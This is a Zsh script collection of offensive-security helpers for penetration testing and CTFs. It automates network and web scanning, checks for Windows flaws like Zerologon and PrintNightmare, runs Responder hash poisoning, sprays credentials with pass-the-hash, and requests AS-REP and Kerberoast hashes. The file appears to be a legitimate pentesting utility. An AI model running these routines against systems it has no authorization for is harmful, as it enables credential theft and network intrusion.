#!/bin/zsh
#
# EZPZ Hacking Scripts (ezpz.sh)
# A collection of Zsh functions to automate and streamline enumeration tasks
# for penetration testing and CTFs.
#
# Author: chsoares
# License: MIT
# Version: 2.3 (Bug Fixes and Feature Integration)
#
# To use, source this file in your .zshrc:
#   source /path/to/ezpz.sh
#
# Then, the functions will be available directly in your terminal.
# For a list of commands, run: ezpz

# NETSCAN
# Discovers live hosts on a network and performs port scans.
#------------------------------------------------------------------------------------
netscan() {
  local usage="
Usage: netscan [-F] <target>
  <target> can be a CIDR range (e.g., 10.10.10.0/24), a single IP, or a file with targets.

  -F    Fast scan. Performs host discovery and a fast port scan only. Skips full TCP and UDP scans.
"
  echo '
              |  \033[1;33m   __|   __|    \     \ | \033[0m
    \    -_)   _|\033[1;33m \__ \  (      _ \   .  | \033[0m
 _| _| \___| \__|\033[1;33m ____/ \___| _/  _\ _|\_|  \033[0m
'
  local fast_scan=0
  local target

  # --- Argument Parsing ---
  while [[ $# -gt 0 ]]; do
    case "$1" in
      -F)
        fast_scan=1
        shift
        ;;
      -h | --help)
        echo "$usage"
        return 0
        ;;
      *)
        if [[ -z "$target" ]]; then
          target="$1"
        else
          echo -e "\033[1;31m[!] Invalid argument: $1\033[0m"
          echo "$usage"
          return 1
        fi
        shift
        ;;
    esac
  done

  if [[ -z "$target" ]]; then
    echo -e "\033[1;31m[!] Missing target. \033[0m"
    echo "$usage"
    return 1
  fi

  # --- Prerequisite Check ---
  for tool in fping nmap; do
    if ! command -v "$tool" &>/dev/null; then
      echo -e "\033[1;31m[!] Required tool not found: $tool \033[0m"
      return 1
    fi
  done

  # --- Temporary File and Trap Management ---
  local targets_tmp
  targets_tmp=$(mktemp)
  # Trap for final cleanup on function exit or termination.
  trap 'rm -f "$targets_tmp";' EXIT TERM
  # Trap for skipping steps on user interrupt (Ctrl+C).
  trap "echo ''" INT

  # --- Input Validation and Host Discovery ---
  local cidr_pattern='^(([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\/([1-9]|[1-2][0-9]|3[0-2])$'
  local ip_pattern='^(([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])$'

  # Host Discovery
  if [[ -f "$target" ]]; then
      # Targets file
      cp "$target" "$targets_tmp"
  elif [[ "$target" =~ $cidr_pattern ]]; then
      # Host discovery
      
      # echo -e "\033[1;35m[!] Scanning $target for live hosts using nmap\033[0m" # Changed from fping message
      # echo -e "\033[0;34m[>] nmap -sn \"$target\" -T4 --min-rate 10000 \033[0m"
      # nmap -sn "$target" -T4 --min-rate 10000 -oG - | awk '/Up$/{print $2}' | tee "$targets_tmp"
      # cat "$targets_tmp" >> hosts.txt && sort -u -o hosts.txt hosts.txt
      # echo -e '\033[0;34m[*] Saving enumerated hosts to ./hosts.txt \033[0m'
      
      #Optional: Keep fping as a faster alternative if desired
      
      echo -e "\033[1;35m[!] Running fping on the $target network\033[0m"
      echo -e "\033[0;34m[>] fping -agq \"$target\" \033[0m"
      fping -agq "$target" | tee "$targets_tmp"
      cat "$targets_tmp" >> hosts.txt && sort -u -o hosts.txt hosts.txt
      echo -e '\033[0;34m[*] Saving enumerated hosts to ./hosts.txt \033[0m'
  elif [[ "$target" =~ $ip_pattern ]]; then
      # Single IP
      echo "$target" > "$targets_tmp"
  fi

  # --- Port Scanning ---
  echo -e '\033[1;35m[!] Running FAST TCP SCAN on known live hosts\033[0m'
  echo -e "\033[0;34m[>] nmap -T4 -Pn -F --min-rate 10000 <target_ip> \033[0m" # Corrected command display
  while read -r item; do
    echo -e "\033[0;36m[*] Scanning $item...\033[0m"
    nmap -T4 -Pn -F --min-rate 10000 "$item" |
      sed -n '/PORT/,$p' |
      sed -n '/Nmap done/q;p' |
      grep --color=never -v '^[[:space:]]*$'
  done <"$targets_tmp" # Read from temporary file

  if [[ $fast_scan -eq 1 ]]; then
    echo -e "\033[1;31m[*] Fast scan complete. \033[0m"
    trap - INT # Restore default INT behavior before returning
    return 0
  fi

  echo -e '\033[1;35m[!] Running FULL TCP SCAN on known live hosts\033[0m'
  echo -e "\033[0;34m[>] nmap -T4 -Pn -sVC -p- --min-rate 10000 -vv <target_ip> \033[0m" # Corrected command display
  while read -r item; do
    echo -e "\033[0;36m[*] Scanning $item...\033[0m"
    nmap -T4 -Pn -sVC -p- "$item" --min-rate 10000 -vv 2>/dev/null |
      sed -n '/PORT/,$p' |
      sed -n '/Script Post-scanning/q;p' |
      grep --color=never -v '^[[:space:]]*$' |
      color yellow "^\|.*"
  done <"$targets_tmp" # Read from temporary file

  echo -e '\033[1;35m[!] Running UDP SCAN on known live hosts\033[0m'
  echo -e "\033[0;34m[>] nmap -T4 -sU --open --min-rate 10000 <target_ip> \033[0m" # Corrected command display
  while read -r item; do
    echo -e "\033[0;36m[*] Scanning $item...\033[0m"
    nmap -T4 -sU --open --min-rate 10000 "$item" |
      sed -n '/PORT/,$p' |
      sed -n '/Nmap done/q;p' |
      grep --color=never -v '^[[:space:]]*$'
  done <"$targets_tmp" # Read from temporary file

  # --- Final Cleanup ---
  trap - INT # Restore default INT behavior before returning
  echo -e "\033[1;31m[*] Done. \033[0m"
  # The EXIT trap will handle file cleanup.
}

# WEBSCAN
# Performs web enumeration using whatweb and ffuf.
#------------------------------------------------------------------------------------
webscan() {
  local usage="
Usage: webscan <url> [-w/--wordlist <wordlist>]
  <url> must be a full URL including http:// or https://.

  -w, --wordlist   Specify a custom wordlist for fuzzing.
                   Default: /usr/share/seclists/Discovery/weblist-chsoares.txt
"
  echo '
                |    \033[1;33m  __|   __|    \     \ | \033[0m
 \ \  \ /  -_)   _ \ \033[1;33m\__ \  (      _ \   .  | \033[0m
  \_/\_/ \___| _.__/ \033[1;33m____/ \___| _/  _\ _|\_| \033[0m
'
  local url=""
  local weblist="/usr/share/seclists/Discovery/weblist-chsoares.txt"

  # --- Argument Parsing ---
  while [[ $# -gt 0 ]]; do
    case "$1" in
      -w | --wordlist)
        if [[ -f "$2" ]]; then
          weblist="$2"
          shift 2
        else
          echo -e "\033[1;31m[!] Wordlist not found: $2 \033[0m"
          return 1
        fi
        ;;
      -h | --help)
        echo "$usage"
        return 0
        ;;
      *)
        if [[ -z "$url" ]]; then
          url="$1"
        else
          echo -e "\033[1;31m[!] Invalid argument: $1\033[0m"
          echo "$usage"
          return 1
        fi
        shift
        ;;
    esac
  done

  if [[ -z "$url" || ! "$url" =~ ^https?:// ]]; then
    echo -e "\033[1;31m[!] Invalid or missing URL. Please include 'http://' or 'https://'. \033[0m"
    echo "$usage"
    return 1
  fi

  for tool in whatweb ffuf; do
    if ! command -v "$tool" &>/dev/null; then
      echo -e "\033[1;31m[!] Required tool not found: $tool \033[0m"
      return 1
    fi
  done

  local host
  host=$(echo "$url" | sed 's|https*://||' | cut -d'/' -f1)
  local is_ip=0
  if [[ "$host" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
    is_ip=1
  fi

  local domain=""
  local tld=""
  if [[ $is_ip -eq 0 ]]; then
    domain=$(echo "$host" | cut -d '.' -f 1)
    tld=$(echo "$host" | cut -d '.' -f 2-)
  fi

  # Set a trap for skipping steps on user interrupt (Ctrl+C).
  trap "echo ''" INT

  # --- Enumeration ---
  echo -e "\033[1;35m[!] Running WhatWeb on $url \033[0m"
  echo -e "\033[0;34m[>] whatweb -a3 -v \"$url\" \033[0m"
  echo ""
  whatweb -a3 -v "$url"
  echo ""

  echo -e "\033[1;35m[!] Fuzzing for directories \033[0m"
  echo -e "\033[0;34m[>] ffuf -u \"$url/FUZZ\" -w \"$weblist\" -c -t 250 -ic -ac -v \033[0m"
  echo ""
  ffuf -u "$url/FUZZ" -w "$weblist" -c -t 250 -ic -ac -v 2>/dev/null |
    grep -vE "FUZZ:|-->"
  echo ""

  if [[ $is_ip -eq 0 ]]; then
    echo -e "\033[1;35m[!] Fuzzing for subdomains \033[0m"
    echo -e "\033[0;34m[>] ffuf -u \"$url\" -w \"$weblist\" -H \"Host: FUZZ.$domain.$tld\" -c -t 250 -ic -ac -v \033[0m"
    echo ""
    ffuf -u "$url" -w "$weblist" -H "Host: FUZZ.$domain.$tld" -c -t 250 -ic -ac -v 2>/dev/null |
      grep -vE "URL|-->"
    echo -e "\033[0;36m[*] Remember to add any discovered subdomain to /etc/hosts :) \033[0m"
    echo ""

    echo -e "\033[1;35m[!] Fuzzing for vhosts \033[0m"
    echo -e "\033[0;34m[>] ffuf -u \"$url\" -w \"$weblist\" -H \"Host: FUZZ.$tld\" -c -t 250 -ic -ac -v \033[0m"
    echo ""
    ffuf -u "$url" -w "$weblist" -H "Host: FUZZ.$tld" -c -t 250 -ic -ac -v 2>/dev/null |
      grep -vE "URL|-->"
    echo ""
  else
    echo -e "\033[1;33m[!] Target is an IP. Skipping subdomain and vhost fuzzing. \033[0m"
    echo ""
  fi

  echo -e "\033[1;35m[!] Fuzzing recursively for common file extensions (this might take long!) \033[0m"
  echo -e "\033[0;34m[>] ffuf -u \"$url/FUZZ\" -w \"$weblist\" -recursion -recursion-depth 1 -e .php,.aspx,.txt,.html -c -t 250 -ic -ac -v \033[0m"
  echo ""
  ffuf -u "$url/FUZZ" -w "$weblist" -recursion -recursion-depth 1 -e .php,.aspx,.txt,.html -c -t 250 -ic -ac -v 2>/dev/null |
    grep -vE "FUZZ:|-->"
  echo ""

  # --- Final Cleanup ---
  trap - INT # Restore default INT behavior before returning
  echo -e "\033[1;31m[*] Done. \033[0m"
}

# CHECKVULNS
# Checks for common low-hanging fruit vulnerabilities on Windows hosts.
#------------------------------------------------------------------------------------
checkvulns() {
  local usage="
Usage: checkvulns -t <target> -u <user> [-p <password> | -H <hash>] [-k]
  <target> can be a single host or a file with one host per line.

  -t, --target    Target IP, hostname, or file containing targets.
  -u, --user      Username for authentication.
  -p, --password  Password for authentication.
  -H, --hash      NTLM hash for pass-the-hash authentication.
  -k, --kerb      Use Kerberos authentication (requires a valid TGT).
"
  local coerce_tmp
  coerce_tmp=$(mktemp)
  trap 'rm -f "$coerce_tmp";' EXIT TERM
  trap "echo ''" INT

  _checkvulns_single() {
    local target_arg="$1"
    shift
    local pass_args=("$@")

    get_auth -t "$target_arg" "${pass_args[@]}"
    if [[ $? -ne 0 ]]; then
      echo -e "\033[1;31m[!] Failed to parse auth for target $target_arg. Skipping.\033[0m"
      return
    fi

    echo -e "\033[1;35m[!] Checking for vulnerabilities on $target_arg \033[0m"

    local smb_test_output
    smb_test_output=$(nxc smb "${nxc_auth[@]}")
    if ! echo "$smb_test_output" | grep -q -a '\[+]'; then
      echo -e "\033[0;33m[*] SMB connection failed or invalid credentials for $target_arg. Skipping. \033[0m"
      return
    fi

    echo -e '\033[0;34m[*] EternalBlue (MS17-010) \033[0m'
    nxc smb "${nxc_auth[@]}" -M ms17-010 | grep -a 'MS17-010' | tr -s " " | cut -d " " -f 3-

    echo -e '\033[0;34m[*] PrintNightmare (CVE-2021-34527) \033[0m'
    nxc smb "${nxc_auth[@]}" -M printnightmare | grep -a 'PRINTNIGHTMARE' | tr -s " " | cut -d " " -f 5- | grep -v "STATUS_ACCESS_DENIED"

    echo -e '\033[0;34m[*] NoPac (CVE-2021-42278) \033[0m'
    nxc smb "${nxc_auth[@]}" -M nopac | grep -a 'NOPAC' | tr -s " " | cut -d " " -f 5- | tr -s '\n'

    echo -e '\033[0;34m[*] Coerce Attacks (PetitPotam, etc.) \033[0m'
    nxc smb "${nxc_auth[@]}" -M coerce_plus | grep -a 'COERCE' | tr -s " " | cut -d " " -f 5- | tee "$coerce_tmp"
    if grep -q "VULNERABLE" "$coerce_tmp"; then
      echo -e "\033[0;36m[+] Try: nxc smb ${nxc_auth[*]} -M coerce_plus -o LISTENER=\$kali\033[0m"
    fi

    echo -e '\033[0;34m[*] Zerologon (CVE-2020-1472) \033[0m'
    nxc smb "${nxc_auth[@]}" -M zerologon | grep -a 'ZEROLOGON' | tr -s " " | cut -d " " -f 5- | sed 's/[-]//g' | grep -v "DCERPCException"
  }

  local target_input=""
  local other_args=()

  while [[ $# -gt 0 ]]; do
    case "$1" in
      -t | --target)
        target_input="$2"
        shift 2
        ;;
      -h | --help)
        echo "$usage"
        trap - INT
        return 0
        ;;
      *)
        other_args+=("$1")
        shift
        ;;
    esac
  done

  if [[ -z "$target_input" ]]; then
    echo -e "\033[1;31m[!] Missing target parameter. \033[0m"
    echo "$usage"
    trap - INT
    return 1
  fi

  if [[ -f "$target_input" ]]; then
    while IFS= read -r host_from_file || [[ -n "$host_from_file" ]]; do
      [[ -z "$host_from_file" ]] && continue
      _checkvulns_single "$host_from_file" "${other_args[@]}"
    done <"$target_input"
  else
    _checkvulns_single "$target_input" "${other_args[@]}"
  fi

  trap - INT
  echo -e "\033[1;31m[*] Done. \033[0m"
}

# ADSCAN
# Discovers hosts, identifies domain controllers, and optionally adds them to /etc/hosts.
#------------------------------------------------------------------------------------
adscan() {
  local usage="
Usage: adscan <target>
  <target> can be a CIDR range (e.g., 10.10.10.0/24), a single IP, or a file with targets.
  This function attempts to write to /etc/hosts and may require sudo.
"
  echo '
             |\033[1;33m   __|   __|    \     \ | \033[0m
   _` |   _` |\033[1;33m \__ \  (      _ \   .  | \033[0m
 \__,_| \__,_|\033[1;33m ____/ \___| _/  _\ _|\_| \033[0m
'
  if [[ $# -eq 0 ]]; then
    echo -e "\033[1;31m[!] Missing parameters. \033[0m"
    echo "$usage"
    return 1
  fi
  local input="$1"

  for tool in fping nxc; do
    if ! command -v "$tool" &>/dev/null; then
      echo -e "\033[1;31m[!] Required tool not found: $tool \033[0m"
      return 1
    fi
  done

  local targets_tmp nxc_tmp nxc_clean
  targets_tmp=$(mktemp)
  nxc_tmp=$(mktemp)
  nxc_clean=$(mktemp)
  trap 'rm -f "$targets_tmp" "$nxc_tmp" "$nxc_clean";' EXIT TERM
  trap 'echo ""' INT # Reverted to original skip behavior

  local cidr_pattern='^(([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\/([1-9]|[1-2][0-9]|3[0-2])$'
  local ip_pattern='^(([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])$'

  # Host Discovery
  if [[ -f "$input" ]]; then
      # Targets file
      cp "$input" "$targets_tmp"
  elif [[ "$input" =~ $cidr_pattern ]]; then
      # Host discovery using fping (original, now uncommenting Nmap option)

      # echo -e "\033[1;35m[!] Scanning $input for live hosts using nmap\033[0m" # Changed from fping message
      # echo -e "\033[0;34m[>] nmap -sn \"$input\" -T4 --min-rate 10000 \033[0m"
      # nmap -sn "$input" -T4 --min-rate 10000 -oG - | awk '/Up$/{print $2}' | tee "$targets_tmp"
      # cat "$targets_tmp" >> hosts.txt && sort -u -o hosts.txt hosts.txt
      # echo -e '\033[0;34m[*] Saving enumerated hosts to ./hosts.txt \033[0m'

      #Optional: Keep fping as a faster alternative if desired
      echo -e "\033[1;35m[!] Running fping on the $input network\033[0m"
      echo -e "\033[0;34m[>] fping -agq \"$input\" \033[0m"
      fping -agq "$input" | tee "$targets_tmp"
      cat "$targets_tmp" >> hosts.txt && sort -u -o hosts.txt hosts.txt
      echo -e '\033[0;34m[*] Saving enumerated hosts to ./hosts.txt \033[0m'
  elif [[ "$input" =~ $ip_pattern ]]; then
      # Single IP
      echo "$input" > "$targets_tmp"
  fi

  echo -e '\033[1;35m[!] Running NetExec on known live hosts \033[0m'
  echo -e "\033[0;34m[>] nxc smb <target_ip> \033[0m" # Corrected command display, no -iL
  # Iterate targets from file, as nxc doesn't support -iL directly for positional args
  while IFS= read -r host_item || [[ -n "$host_item" ]]; do
      [[ -z "$host_item" ]] && continue
      echo -e "\033[0;36m[*] Scanning $host_item...\033[0m"
      nxc smb "$host_item" | tr -s " "
  done <"$targets_tmp" | tee "$nxc_tmp" # Pipe full output to tee and then to nxc_tmp

  if [[ $? -ne 0 || ! -s "$nxc_tmp" ]]; then
    echo -e "\033[1;31m[!] NetExec failed or returned no results. \033[0m"
    trap - INT
    return 1
  else
    # Only process nxc.tmp if it has content, no need to re-cat if tee already showed it
    : # No action, tee already displayed.
  fi

  sed 's/\x1B\[[0-9;]*[a-zA-Z]//g' "$nxc_tmp" >"$nxc_clean"
  local hosts_count
  hosts_count=$(cat "$nxc_clean" | head -n -1 | wc -l)

  echo -e "\033[1;36m[?] Add discovered hosts to /etc/hosts? [y/N] \033[0m"
    read -s -q confirm
    if [[ "$confirm" =~ ^[Yy]$ ]]; then
    
      while IFS= read -r line; do
          [[ -z "$line" ]] && continue
          [[ "$line" =~ ^SMB ]] || continue

          ip=$(awk '{for(i=1;i<=NF;i++) if ($i ~ /([0-9]{1,3}\.){3}[0-9]{1,3}/) {print $i; break}}' <<< "$line")
          hostname=$(sed -n 's/.*(name:\([^)]*\)).*/\1/p' <<< "$line" | tr -d '\r\n\t ' | tr -cd '[:print:]')
          domain_name=$(sed -n 's/.*(domain:\([^)]*\)).*/\1/p' <<< "$line" | tr -d '\r\n\t ' | tr -cd '[:print:]')
          is_dc=$(awk 'BEGIN{IGNORECASE=1} /DC/ {print 1}' <<< "$line")

          if [[ -n "$domain_name" ]]; then
              if [[ $is_dc -eq 1 || $hosts_count -eq 1 ]]; then
                  new_entry="$ip    DC $hostname $hostname.$domain_name $domain_name"
                  zshenv add domain=$domain
              else
                  new_entry="$ip    $hostname $hostname.$domain_name"
              fi
          else
              new_entry="$ip    $hostname"
          fi

          if ! grep -q -F "$ip" /etc/hosts; then
              echo "$new_entry" | tee -a /etc/hosts
          fi
      done < $nxc_clean
       
        echo -e "\033[0;34m[*] New hosts added to /etc/hosts successfully. \033[0m"
        echo -e "\033[0;36m[*]\033[0m \033[0;33m\$domain \033[0mis set to $domain \033[0m"
    fi

  # Responder ----------------
  if [[ -s "$nxc_tmp" ]]; then # Check if any hosts were found by nxc
    echo -e "\033[1;36m[?] Windows hosts detected. Start Responder to capture hashes? [y/N] \033[0m"
    read -s -q confirm_responder
    echo ""
    if [[ "$confirm_responder" =~ ^[Yy]$ ]]; then
      # Restore default INT behavior before calling the next function
      trap - INT
      startresponder
    fi
  fi
  # -----------------------------------------

  trap - INT
  echo -e "\033[1;31m[*] Done. \033[0m"
}

# STARTRESPONDER
# A smart wrapper to launch Responder for LLMNR/NBT-NS/mDNS poisoning attacks.
#------------------------------------------------------------------------------------
startresponder() {
  local usage="
Usage: startresponder
  Interactively launches Responder on a chosen network interface.
  This function requires sudo privileges and the 'responder' tool.
"
  # --- Prerequisite & Privilege Check ---
  if ! command -v responder &>/dev/null; then
    echo -e "\033[1;31m[!] Required tool not found: responder \033[0m"
    echo "Install it via: sudo apt install responder"
    return 1
  fi

  if [[ $EUID -ne 0 ]]; then
    echo -e "\033[1;31m[!] This action requires root privileges. Please run with sudo:\033[0m"
    echo "  sudo $(fc -ln -1)"
    return 1
  fi

  # --- Interface Selection ---
  local interfaces
  # Get a list of active, non-loopback interfaces
  interfaces=($(ip -o -br link | awk '$1!="lo" {print $1}'))

  if [[ ${#interfaces[@]} -eq 0 ]]; then
    echo -e "\033[1;31m[!] No active network interfaces found (besides lo). \033[0m"
    return 1
  elif [[ ${#interfaces[@]} -eq 1 ]]; then
    # If only one interface, select it automatically
    local interface="${interfaces[1]}"
    echo -e "\033[1;35m[!] Automatically selected the only active interface: $interface \033[0m"
  else
    # If multiple interfaces, prompt the user
    echo -e "\033[1;36m[?] Please choose the interface to listen on:\033[0m"
    select interface in "${interfaces[@]}"; do
      if [[ -n "$interface" ]]; then
        break
      else
        echo -e "\033[1;31m[!] Invalid selection. Please try again.\033[0m"
      fi
    done
  fi

  # --- Execution ---
  local responder_log_dir="/usr/share/responder/logs"
  echo -e "\033[1;35m[!] Starting Responder. Hashes will be saved in: $responder_log_dir \033[0m"
  echo -e "\033[0;34m[>] responder -I \"$interface\" -dwv \033[0m"
  echo -e "\033[0;36m[*] Press Ctrl+C to stop Responder. \033[0m"
  
  # The trap ensures that when Responder is stopped, we give helpful next steps.
  trap 'echo -e "\n\033[1;33m[*] Responder stopped. Check for captured hashes!\033[0m"; echo -e "\033[0;36m[>] To crack a NetNTLMv2 hash: hashcat -m 5600 hash.txt rockyou.txt\033[0m"; trap - INT; return' INT
  
  # Execute Responder. This will block until Ctrl+C is pressed.
  responder -I "$interface" -dwv

  # Restore default INT behavior after the function is done.
  trap - INT
}

# TESTCREDS
# Tests credentials against multiple protocols on a target or list of targets.
#------------------------------------------------------------------------------------
testcreds() {
    echo '  
  |               |  \033[1;33m   __|  _ \  __|  _ \    __| \033[0m
   _|   -_) (_-<   _|\033[1;33m  (       /  _|   |  | \__ \ \033[0m
 \__| \___| ___/ \__|\033[1;33m \___| _|_\ ___| ___/  ____/ \033[0m
'                                               

    local target_arg=""
    local file_arg=""
    local user_arg=""
    local pass_arg=""
    local hash_arg=""
    local protocols_arg=""
    local kerb_arg=""
    local other_args=()

    while [[ $# -gt 0 ]]; do
        case "$1" in
            -t|--target)
                target_arg="$2"
                shift
                ;;
            -f|--file)
                file_arg="$2"
                shift
                ;;
            -u|--user)
                user_arg="$2"
                shift
                ;;
            -p|--password)
                pass_arg="$2"
                shift
                ;;
            -H|--hash)
                hash_arg="$2"
                shift
                ;;
            -k|--kerb)
                kerb_arg="-k"
                ;;
            -x|--protocols)
                protocols_arg="$2"
                shift
                ;;
            *)
                other_args+=("$1")
                if [[ "$2" != "" && "$2" != -* ]]; then
                    other_args+=("$2")
                    shift
                fi
                ;;
        esac
        shift
    done

    if [ -z "$target_arg" ]; then
        echo -e "\033[1;31m[!] Missing target parameter. \033[0m"
        echo "Usage: $0 -t target [-f file] [-u user] [-p password] [-H hash] [-k] [-x protocols]"
        exit 1
    fi

    local default_protocols="smb,winrm,mssql,rdp,ssh,ftp"
    local protocols_to_test_string
    
    if [[ -z "$protocols_arg" || "$protocols_arg" == "all" ]]; then
        protocols_to_test_string="$default_protocols"
    else
        protocols_to_test_string="$protocols_arg"
    fi

    local protocols_to_test=("${(s/,/)protocols_to_test_string}")

    local auth_tmp=$(mktemp /tmp/auth.XXXXXX)

    trap "rm -f '$auth_tmp'; echo ''" INT

    if [[ -n "$file_arg" ]]; then
        if [[ ! -f "$file_arg" ]]; then
            echo -e "\033[1;31m[!] File '$file_arg' not found. \033[0m"
            rm -f "$auth_tmp"
            exit 1
        fi
        while IFS= read -r line || [ -n "$line" ]; do
            if [ -z "$line" ]; then
                continue
            fi
            local user_from_file=$(echo "$line" | cut -d: -f1)
            local pass_or_hash_from_file=$(echo "$line" | cut -d: -f2)
            local cred_type_from_file=""
            if [[ $pass_or_hash_from_file =~ ^[a-fA-F0-9]{32}$ ]]; then
                cred_type_from_file="-H"
            else
                cred_type_from_file="-p"
            fi
            echo "-t \"$target_arg\" -u \"$user_from_file\" $cred_type_from_file \"$pass_or_hash_from_file\" $kerb_arg ${other_args[@]}" >> "$auth_tmp"
        done < "$file_arg"
    else
        local cred_line="-t \"$target_arg\""
        if [[ -n "$user_arg" ]]; then
            cred_line+=" -u \"$user_arg\""
        fi
        if [[ -n "$pass_arg" ]]; then
            cred_line+=" -p \"$pass_arg\""
        elif [[ -n "$hash_arg" ]]; then
            cred_line+=" -H \"$hash_arg\""
        fi
        cred_line+=" $kerb_arg ${other_args[@]}"
        echo "$cred_line" > "$auth_tmp"
    fi

    while IFS= read -r line || [ -n "$line" ]; do
        if [ -z "$line" ]; then
            continue
        fi

        local current_user=""
        local current_target=""
        
        # Parse the line into arguments for easier extraction of user/target.
        local args_from_line=("${(z)line}")

        for ((idx=1; idx <= ${#args_from_line[@]}; idx++)); do
            case "${args_from_line[idx]}" in
                -t|--target)
                    if (( idx + 1 <= ${#args_from_line[@]} )); then
                        current_target="${args_from_line[idx+1]//\"/}" # Remove quotes
                    fi
                    ((idx++))
                    ;;
                -u|--user)
                    if (( idx + 1 <= ${#args_from_line[@]} )); then
                        current_user="${args_from_line[idx+1]//\"/}" # Remove quotes
                    fi
                    ((idx++))
                    ;;
            esac
        done

        # Execute get_auth to set nxc_auth and imp_auth.
        if ! eval get_auth $line; then
            echo -e "\033[1;31m[!] Failed to parse authentication arguments for line: $line\033[0m"
            continue
        fi
        
        echo -e "\033[1;35m[!] Testing $current_user's credentials on $current_target with NetExec\033[0m"
        echo -e "\033[0;34m[>] nxc <PROTOCOL> ${nxc_auth[@]} \033[0m" 

        for protocol in "${protocols_to_test[@]}"; do
            echo -e "\033[0;36m[*] Trying $(echo $protocol | tr '[:lower:]' '[:upper:]')... \033[0m"
            
            nxc "$protocol" "${nxc_auth[@]}" 2>/dev/null | grep --text --color=never + | highlight red "(Pwn3d!)" | tr -s " "
            
            if [[ "$protocol" != "ssh" && "$protocol" != "ftp" ]]; then
                nxc "$protocol" "${nxc_auth[@]}" --local-auth 2>/dev/null | grep --text --color=never + | awk '{print $0 " (local auth)"}' | highlight red "(Pwn3d!)" | tr -s " "
            fi
        done
        
    done < "$auth_tmp"

    rm -f "$auth_tmp" 2>/dev/null
    trap - INT
    echo -e "\033[1;31m[*] Done. \033[0m"
}


# ENUMDOMAIN
# Performs a wide range of Active Directory domain enumeration tasks.
#------------------------------------------------------------------------------------
enumdomain() {
  local usage="
Usage: enumdomain -t <target> -u <user> [-p <password> | -H <hash>] [-k]
  Enumerates an Active Directory domain for users, groups, policies, and misconfigurations.

  -t, --target    Target Domain Controller IP or hostname. (Required)
  -u, --user      Username for authentication.
  -p, --password  Password for authentication.
  -H, --hash      NTLM hash for pass-the-hash authentication.
  -k, --kerb      Use Kerberos authentication (requires a valid TGT).
"
  echo '
                           \033[1;33m  _ \   _ \   \  |    \   _ _|   \ | \033[0m
     -_)    \   |  |   ` \ \033[1;33m  |  | (   | |\/ |   _ \    |   .  | \033[0m
   \___| _| _| \_,_| _|_|_|\033[1;33m ___/ \___/ _|  _| _/  _\ ___| _|\_| \033[0m
'
  get_auth "$@"
  if [[ $? -ne 0 ]]; then
    echo "$usage"
    return 1
  fi

  local users_tmp
  users_tmp=$(mktemp)
  trap 'rm -f "$users_tmp";' EXIT TERM
  trap "echo ''" INT

  echo -e "\033[1;37m[\033[1;35m+\033[1;37m] Starting user & group enumeration... \033[0m"

  echo -e "\033[1;36m[?] Bruteforce RIDs to find all domain users? [y/N]\033[0m"
  read -s -q confirm
  echo ""
  if [[ "$confirm" =~ ^[Yy]$ ]]; then
    echo -e "\033[1;35m[!] Enumerating all users with RID Bruteforcing \033[0m"
    echo -e "\033[0;34m[>] nxc smb ${nxc_auth[@]} --rid-brute 5000 \033[0m"
    nxc smb "${nxc_auth[@]}" --rid-brute 10000 2>/dev/null |
      grep 'SidTypeUser' | cut -d ':' -f2 | cut -d '\' -f2 | cut -d ' ' -f1 | tee "$users_tmp" # Use tee
    if [[ -s "$users_tmp" ]]; then
      cp "$users_tmp" ./users.list
      echo -e "\033[0;34m[*] Saving enumerated users to ./users.list \033[0m"
    else
      echo -e "\033[1;31m[!] No users found during RID Bruteforcing. \033[0m"
    fi
  fi

  echo -e "\033[1;35m[!] Enumerating groups \033[0m"
  echo -e "\033[0;34m[>] nxc smb ${nxc_auth[@]} --groups \033[0m"
  nxc smb "${nxc_auth[@]}" --groups 2>/dev/null | grep 'membercount' | tr -s " " | cut -d ' ' -f 5- | grep -v 'membercount: 0' | sed "s/membercount:/-/g"

  echo -e "\033[1;35m[!] Enumerating privileged users \033[0m"
  echo -e "\033[0;34m[>] nxc ldap ${nxc_auth[@]} --admin-count \033[0m"
  nxc ldap "${nxc_auth[@]}" --admin-count 2>/dev/null | grep -v '\[.\]' | tr -s " " | cut -d ' ' -f 5

  echo -e "\033[1;35m[!] Enumerating user descriptions for clues \033[0m"
  echo -e "\033[0;34m[>] nxc ldap ${nxc_auth[@]} -M user-desc \033[0m"
  nxc ldap "${nxc_auth[@]}" -M user-desc 2>/dev/null | grep --color=never -o "User:.*"

  echo -e "\n\033[1;37m[\033[1;35m+\033[1;37m] Looking for exploitable accounts... \033[0m"

  echo -e "\033[1;35m[!] Searching for AS-REProastable users \033[0m"
  echo -e "\033[0;34m[>] GetNPUsers.py "${imp_auth[@]}" -request \033[0m"
  GetNPUsers.py "${imp_auth[@]}" -request 2>/dev/null | grep --color=never "\S" | tail -n +4 | awk {'print $1'}
  GetNPUsers.py "${imp_auth[@]}" -request -outputfile asrep.hash >/dev/null 2>&1
  [[ -f ./asrep.hash ]] && echo -e '\033[0;34m[*] Saving hashes to ./asrep.hash \033[0m'

  echo -e "\033[1;35m[!] Searching for Kerberoastable users \033[0m"
  echo -e "\033[0;34m[>] GetUserSPNs.py "${imp_auth[@]}" -request \033[0m"
  GetUserSPNs.py "${imp_auth[@]}" -request 2>/dev/null | grep --color=never "\S" | tail -n +4 | awk {'print $2 " ||| "$1'} | column -s "|||" -t
  GetUserSPNs.py "${imp_auth[@]}" -request -outputfile kerb.hash >/dev/null 2>&1
  [[ -f ./kerb.hash ]] && echo -e '\033[0;34m[*] Saving hashes to ./kerb.hash \033[0m'

  echo -e "\033[1;35m[!] Searching for accounts with PASSWD_NOTREQD flag \033[0m"
  echo -e "\033[0;34m[>] nxc ldap ${nxc_auth[@]} --password-not-required \033[0m"
  nxc ldap "${nxc_auth[@]}" --password-not-required 2>/dev/null | grep --color=never -ao "User:.*"

  if [[ -s "$users_tmp" ]]; then
